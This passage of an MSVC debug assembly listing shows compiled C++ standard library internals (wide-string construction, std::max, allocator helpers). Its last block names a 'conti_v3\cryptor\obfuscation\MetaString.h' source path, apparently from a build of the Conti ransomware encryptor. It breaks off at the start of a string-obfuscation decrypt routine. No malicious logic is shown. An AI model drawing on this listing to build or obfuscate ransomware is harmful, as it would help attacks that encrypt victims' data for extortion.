	00 00		 mov	 rcx, QWORD PTR <_Args_0>$[rbp]
  00052	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00055	48 89 08	 mov	 QWORD PTR [rax], rcx

; 256  :     }
; 257  : }

  00058	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0005f	5f		 pop	 rdi
  00060	5d		 pop	 rbp
  00061	c3		 ret	 0
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ENDP ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z
_TEXT	SEGMENT
_Fancy_ptr$ = 8
_Al$ = 256
_Capacity$ = 264
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>, COMDAT

; 2611 :     _NODISCARD static _CONSTEXPR20 pointer _Allocate_for_capacity(_Alty& _Al, size_type& _Capacity) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2612 :         _STL_INTERNAL_CHECK(_Capacity > _Small_string_capacity);
; 2613 :         ++_Capacity; // Take null terminator into consideration

  00024	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Capacity$[rbp]
  0002b	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0002e	48 ff c0	 inc	 rax
  00031	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Capacity$[rbp]
  00038	48 89 01	 mov	 QWORD PTR [rcx], rax

; 2614 : 
; 2615 :         pointer _Fancy_ptr;
; 2616 :         if constexpr (_Policy == _Allocation_policy::_At_least) {
; 2617 :             _Fancy_ptr = _Allocate_at_least_helper(_Al, _Capacity);

  0003b	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR _Capacity$[rbp]
  00042	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  00049	e8 00 00 00 00	 call	 ??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
  0004e	48 89 45 08	 mov	 QWORD PTR _Fancy_ptr$[rbp], rax

; 2618 :         } else {
; 2619 :             _STL_INTERNAL_STATIC_ASSERT(_Policy == _Allocation_policy::_Exactly);
; 2620 :             _Fancy_ptr = _Al.allocate(_Capacity);
; 2621 :         }
; 2622 : 
; 2623 : #if _HAS_CXX20
; 2624 :         // Start element lifetimes to avoid UB. This is a more general mechanism than _String_val::_Activate_SSO_buffer,
; 2625 :         // but likely more impactful to throughput.
; 2626 :         if (_STD is_constant_evaluated()) {
; 2627 :             _Elem* const _Ptr = _Unfancy(_Fancy_ptr);
; 2628 :             for (size_type _Idx = 0; _Idx < _Capacity; ++_Idx) {
; 2629 :                 _STD construct_at(_Ptr + _Idx);
; 2630 :             }
; 2631 :         }
; 2632 : #endif // _HAS_CXX20
; 2633 :         --_Capacity;

  00052	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Capacity$[rbp]
  00059	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0005c	48 ff c8	 dec	 rax
  0005f	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Capacity$[rbp]
  00066	48 89 01	 mov	 QWORD PTR [rcx], rax

; 2634 :         return _Fancy_ptr;

  00069	48 8b 45 08	 mov	 rax, QWORD PTR _Fancy_ptr$[rbp]

; 2635 :     }

  0006d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00074	5f		 pop	 rdi
  00075	5d		 pop	 rbp
  00076	c3		 ret	 0
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$max@_K@std@@YAAEB_KAEB_K0@Z
_TEXT	SEGMENT
$T1 = 200
tv65 = 216
_Left$ = 256
_Right$ = 264
??$max@_K@std@@YAAEB_KAEB_K0@Z PROC			; std::max<unsigned __int64>, COMDAT

; 75   :     (max) (const _Ty& _Left, const _Ty& _Right) noexcept(noexcept(_Left < _Right)) /* strengthened */ {

$LN5:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__2F328FEB_utility
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 76   :     // return larger of _Left and _Right
; 77   :     return _Left < _Right ? _Right : _Left;

  00024	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  0002b	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00032	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00035	48 39 08	 cmp	 QWORD PTR [rax], rcx
  00038	73 10		 jae	 SHORT $LN3@max
  0003a	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  00041	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
  00048	eb 0e		 jmp	 SHORT $LN4@max
$LN3@max:
  0004a	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  00051	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
$LN4@max:
  00058	48 8b 85 d8 00
	00 00		 mov	 rax, QWORD PTR tv65[rbp]
  0005f	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00066	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]

; 78   : }

  0006d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00074	5f		 pop	 rdi
  00075	5d		 pop	 rbp
  00076	c3		 ret	 0
??$max@_K@std@@YAAEB_KAEB_K0@Z ENDP			; std::max<unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z
_TEXT	SEGMENT
_Ptr$ = 224
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z PROC			; std::_Unfancy<wchar_t>, COMDAT

; 35   : _NODISCARD constexpr _Ty* _Unfancy(_Ty* _Ptr) noexcept { // do nothing for plain pointers

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 36   :     return _Ptr;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]

; 37   : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ENDP			; std::_Unfancy<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
_TEXT	SEGMENT
_My_data$ = 8
_Al$ = 40
_Alproxy$ = 72
_Proxy$ = 100
_New_capacity$ = 136
_New_ptr$ = 168
$T6 = 388
$T7 = 420
__$ArrayPad$ = 440
this$ = 480
_Arg$ = 488
_Count$ = 496
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>, COMDAT

; 2659 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN5:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 01
	00 00		 sub	 rsp, 488		; 000001e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00022	b9 42 00 00 00	 mov	 ecx, 66			; 00000042H
  00027	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0002c	f3 ab		 rep stosd
  0002e	48 8b 8c 24 08
	02 00 00	 mov	 rcx, QWORD PTR [rsp+520]
  00036	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0003d	48 33 c5	 xor	 rax, rbp
  00040	48 89 85 b8 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00047	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0004e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2660 :         auto& _My_data = _Mypair._Myval2;

  00053	48 8b 85 e0 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0005a	48 89 45 08	 mov	 QWORD PTR _My_data$[rbp], rax

; 2661 :         _STL_INTERNAL_CHECK(!_My_data._Large_mode_engaged());
; 2662 : 
; 2663 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2664 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2665 :         } else {
; 2666 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2667 :         }
; 2668 : 
; 2669 :         if (_Count > max_size()) {

  0005e	48 8b 8d e0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00065	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  0006a	48 39 85 f0 01
	00 00		 cmp	 QWORD PTR _Count$[rbp], rax
  00071	76 05		 jbe	 SHORT $LN2@Construct

; 2670 :             _Xlen_string(); // result too long

  00073	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Construct:

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();

  00078	48 8b 8d e0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00084	48 89 45 28	 mov	 QWORD PTR _Al$[rbp], rax

; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);

  00088	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
  0008f	48 89 45 48	 mov	 QWORD PTR _Alproxy$[rbp], rax

; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);

  00093	4c 8b 45 08	 mov	 r8, QWORD PTR _My_data$[rbp]
  00097	48 8b 55 48	 mov	 rdx, QWORD PTR _Alproxy$[rbp]
  0009b	48 8d 4d 64	 lea	 rcx, QWORD PTR _Proxy$[rbp]
  0009f	e8 00 00 00 00	 call	 ??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  000a4	48 83 bd f0 01
	00 00 07	 cmp	 QWORD PTR _Count$[rbp], 7
  000ac	77 6a		 ja	 SHORT $LN3@Construct

; 2678 :             _My_data._Mysize = _Count;

  000ae	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000b2	48 8b 8d f0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  000b9	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  000bd	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000c1	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 2680 : 
; 2681 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2682 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2683 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2684 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2685 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count);

  000c9	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000cd	4c 8b 85 f0 01
	00 00		 mov	 r8, QWORD PTR _Count$[rbp]
  000d4	48 8b 95 e8 01
	00 00		 mov	 rdx, QWORD PTR _Arg$[rbp]
  000db	48 8b c8	 mov	 rcx, rax
  000de	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 2686 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());

  000e3	33 c0		 xor	 eax, eax
  000e5	66 89 85 84 01
	00 00		 mov	 WORD PTR $T6[rbp], ax
  000ec	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000f0	48 8b 8d f0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  000f7	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  000fb	48 8d 95 84 01
	00 00		 lea	 rdx, QWORD PTR $T6[rbp]
  00102	48 8b c8	 mov	 rcx, rax
  00105	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 2687 :             } else { // _Strat == _Construct_strategy::_From_string
; 2688 : #ifdef _INSERT_STRING_ANNOTATION
; 2689 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count + 1);
; 2690 : #else // ^^^ _INSERT_STRING_ANNOTATION / !_INSERT_STRING_ANNOTATION vvv
; 2691 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _BUF_SIZE);
; 2692 : #endif // ^^^ !_INSERT_STRING_ANNOTATION ^^^
; 2693 :             }
; 2694 : 
; 2695 :             _Proxy._Release();

  0010a	48 8d 4d 64	 lea	 rcx, QWORD PTR _Proxy$[rbp]
  0010e	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2696 :             return;

  00113	e9 c9 00 00 00	 jmp	 $LN1@Construct
$LN3@Construct:

; 2697 :         }
; 2698 : 
; 2699 :         size_type _New_capacity = _Calculate_growth(_Count, _Small_string_capacity, max_size());

  00118	48 8b 8d e0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011f	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00124	4c 8b c0	 mov	 r8, rax
  00127	ba 07 00 00 00	 mov	 edx, 7
  0012c	48 8b 8d f0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  00133	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  00138	48 89 85 88 00
	00 00		 mov	 QWORD PTR _New_capacity$[rbp], rax

; 2700 :         const pointer _New_ptr  = _Allocate_for_capacity(_Al, _New_capacity); // throws

  0013f	48 8d 95 88 00
	00 00		 lea	 rdx, QWORD PTR _New_capacity$[rbp]
  00146	48 8b 4d 28	 mov	 rcx, QWORD PTR _Al$[rbp]
  0014a	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  0014f	48 89 85 a8 00
	00 00		 mov	 QWORD PTR _New_ptr$[rbp], rax

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  00156	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0015a	48 8d 95 a8 00
	00 00		 lea	 rdx, QWORD PTR _New_ptr$[rbp]
  00161	48 8b c8	 mov	 rcx, rax
  00164	e8 00 00 00 00	 call	 ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>

; 2702 : 
; 2703 :         _My_data._Mysize = _Count;

  00169	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0016d	48 8b 8d f0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  00174	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 2704 :         _My_data._Myres  = _New_capacity;

  00178	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0017c	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR _New_capacity$[rbp]
  00183	48 89 48 18	 mov	 QWORD PTR [rax+24], rcx

; 2705 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2706 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2707 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2708 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2709 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);

  00187	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  0018e	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  00193	4c 8b 85 f0 01
	00 00		 mov	 r8, QWORD PTR _Count$[rbp]
  0019a	48 8b 95 e8 01
	00 00		 mov	 rdx, QWORD PTR _Arg$[rbp]
  001a1	48 8b c8	 mov	 rcx, rax
  001a4	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 2710 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());

  001a9	33 c0		 xor	 eax, eax
  001ab	66 89 85 a4 01
	00 00		 mov	 WORD PTR $T7[rbp], ax
  001b2	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  001b9	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  001be	48 8b 8d f0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  001c5	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  001c9	48 8d 95 a4 01
	00 00		 lea	 rdx, QWORD PTR $T7[rbp]
  001d0	48 8b c8	 mov	 rcx, rax
  001d3	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 2711 :         } else { // _Strat == _Construct_strategy::_From_string
; 2712 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);
; 2713 :         }
; 2714 : 
; 2715 :         _ASAN_STRING_CREATE(*this);
; 2716 :         _Proxy._Release();

  001d8	48 8d 4d 64	 lea	 rcx, QWORD PTR _Proxy$[rbp]
  001dc	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release
$LN1@Construct:
$LN4@Construct:

; 2717 :     }

  001e1	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  001e5	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcFrameData
  001ec	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  001f1	48 8b 8d b8 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  001f8	48 33 cd	 xor	 rcx, rbp
  001fb	e8 00 00 00 00	 call	 __security_check_cookie
  00200	48 8d a5 c8 01
	00 00		 lea	 rsp, QWORD PTR [rbp+456]
  00207	5f		 pop	 rdi
  00208	5d		 pop	 rbp
  00209	c3		 ret	 0
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Convert_size@_K_K@std@@YA_K_K@Z
_TEXT	SEGMENT
_Len$ = 224
??$_Convert_size@_K_K@std@@YA_K_K@Z PROC		; std::_Convert_size<unsigned __int64,unsigned __int64>, COMDAT

; 1112 :     sizeof(_Unsigned_type) <= sizeof(_Size_type)) {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1113 :     // convert _Unsigned_type to _Size_type, avoiding truncation
; 1114 :     _STL_INTERNAL_STATIC_ASSERT(_Unsigned_type(-1) > 0);
; 1115 :     _STL_INTERNAL_STATIC_ASSERT(_Size_type(-1) > 0);
; 1116 : 
; 1117 :     if constexpr (sizeof(_Unsigned_type) > sizeof(_Size_type)) {
; 1118 :         if (_Len > (numeric_limits<_Size_type>::max)()) {
; 1119 :             _Xlength_error("size is too long for _Size_type");
; 1120 :         }
; 1121 :     }
; 1122 : 
; 1123 :     return static_cast<_Size_type>(_Len);

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Len$[rbp]

; 1124 : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$_Convert_size@_K_K@std@@YA_K_K@Z ENDP		; std::_Convert_size<unsigned __int64,unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>, COMDAT

; 1523 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00023	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0002a	e8 00 00 00 00	 call	 ??0?$allocator@_W@std@@QEAA@XZ ; std::allocator<wchar_t>::allocator<wchar_t>
  0002f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00036	48 8b c8	 mov	 rcx, rax
  00039	e8 00 00 00 00	 call	 ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
  0003e	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00045	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
